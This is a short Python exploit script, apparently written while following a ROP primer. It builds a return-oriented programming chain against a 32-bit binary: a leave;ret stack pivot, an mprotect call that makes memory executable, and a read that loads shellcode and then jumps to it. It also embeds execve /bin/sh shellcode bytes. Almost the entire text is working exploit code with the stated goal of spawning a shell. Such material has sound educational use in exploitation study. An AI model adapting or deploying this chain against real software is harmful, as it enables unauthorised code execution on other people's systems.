#!/usr/bin/python

# following along here
# https://speakerd.s3.amazonaws.com/presentations/6486b353d27b45038d6b4286acbc9390/rop-primer.pdf

''' shellcode
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
'''

'''
You're going to need to change the addrs of the functions for the ROP chain
'''

import struct
def p(x):
    return struct.pack('<L', x)

payload = ""
''' do leave; ret to restore the stack to our payload
 if we don't do a leave; ret, the stack is still the legit stack
 of the program filled with
[------------------------------------stack-------------------------------------]
0000| 0xffffd4b0 --> 0x20000000 --> 0x0
0004| 0xffffd4b4 --> 0x400
0008| 0xffffd4b8 --> 0x1
0012| 0xffffd4bc --> 0x22 ('"')
0016| 0xffffd4c0 --> 0xffffffff
0020| 0xffffd4c4 --> 0x0
0024| 0xffffd4c8 --> 0xffffd58c --> 0xffffd713 ("XDG_VTNR=1")
0028| 0xffffd4cc --> 0xf7e4842d (<__cxa_atexit+29>:     test   eax,eax)

which won't be useful to us because we need to get args for the mprotect()
system call onto the stack

ebp helpfully points to the payload we have injected
we exec leave (mov esp, ebp; pop ebp)
which will put the payload into esp, then add esp,4
leaving us with ESP pointing to <mprotect> and our args to mprotect
on the stack

tl;dr the leave puts our payload on the stack. We now have full control
over the stack and where we are going with RET, so we can execute our
ROP chain to spawn a shell

'''
payload += p(0x80483e8) # leave; ret
payload += "A"*12 # dummy

# make memory section rwx
# int mprotect(void *addr, size_t len, int prot);
payload += p(0xf7efc0d0) # mprotect()
payload += p(0x804855d) # pppr (pop3ret)
payload += p(0x20000000) # mprotect argv[0] - addr to make executable
payload += p(0x1000) # mprotect argv [1] page-aligned size
payload += p(0x7) # mprotect argv [2] PROT|READ|PROT|WRITE|PROT_EXEC

# read shellcode into buffer
# ssize_t read(int fd, void *buf, size_t count);
payload += p(0xf7eefbd0) # read@plt
payload += p(0x804855d) # pppr
payload += p(0x0) # fd = STDIN
payload += p(0x20000000) #buf
payload += p(0x200) # len

# return to buffer with shellcode, exec it
payload += p(0x20000000) # mprotect argv[0] - addr to make executable

print payload
